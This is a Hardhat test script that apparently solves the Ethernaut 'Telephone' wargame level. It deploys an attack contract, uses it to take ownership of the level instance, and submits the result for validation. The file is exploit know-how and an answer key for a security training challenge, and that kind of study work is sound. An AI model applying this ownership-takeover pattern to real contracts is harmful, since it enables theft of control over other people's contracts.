import {ethers} from 'hardhat'
import {Contract, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK} from './testUtil'

const LEVEL_ADDRESS = '0x0b6F6CE4BCfB70525A31454292017F640C10c768'
const INSTANCE_ADDRESS = '0xD484c3b98c6efe48338877600CDb1b1eD7Caf7d2'

describe('04 Telephone', () => {
  let ethernaut: Contract
  let instance: Contract
  let attack: Contract
  let signer: Signer
  let signerAddress: string

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('Telephone', INSTANCE_ADDRESS)

    const factory = await ethers.getContractFactory('TelephoneAttack')
    attack = await factory.deploy(instance.address)

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
  })

  it('calls changeOwner through attack contract', async () => {
      const tx = await attack.doChangeOwner()
      return expectStatusOK(tx)
  })

  it('has become owner', async () => {
    const ownerAddr = await instance.owner()
    expect(ownerAddr).to.equal(signerAddress)
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
